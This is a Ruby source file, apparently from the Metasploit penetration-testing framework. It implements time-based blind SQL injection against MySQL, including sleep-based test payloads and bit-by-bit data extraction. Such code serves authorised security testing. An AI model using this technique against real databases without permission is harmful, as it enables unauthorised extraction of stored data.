#
#   Time-Based Blind SQL injection support for MySQL
#
class Msf::Exploit::SQLi::MySQLi::TimeBasedBlind < Msf::Exploit::SQLi::MySQLi::Common
  def initialize(opts, &query_proc)
    @sleepdelay = opts[:sleepdelay] || 1
    super
  end

  def run_sql(query)
    # TODO: detect latency and update sleepdelay manually?
    puts "[*] Executing (#{query})" if @verbose
    if @hex_encode_strings
      query = hex_encode_strings(query)
      puts "[*] Encoded to (#{query})" if @verbose
    end
    # first, get the length of the output
    output_length = blind_detect_length(query, true)
    puts "[*] Time-based injection: expecting output of length #{output_length}" if @verbose
    # now, get the output, of the given length
    print '[+] Data: ' if @verbose
    blind_dump_data(query, output_length, true)
  end

  #
  # This method checks if the target is vulnerable to Blind time-based injection by checking if
  # the target sleeps only when a given condition is true.
  #
  def test_vulnerable
    # run_sql and check if output is what's expected, or just check for delays?
    out_true = blind_request("if(1=1,sleep(#{@sleepdelay}),0)")
    out_false = blind_request("if(1=2,sleep(#{@sleepdelay}),0)")
    out_true && !out_false
  end

  private

  #
  # Performs one request, and does timing measurement, should leak one bit of information
  #
  def blind_request(query)
    time = Time.now
    @query_proc.call(query)
    diff = Time.now - time
    diff >= @sleepdelay
  end

end
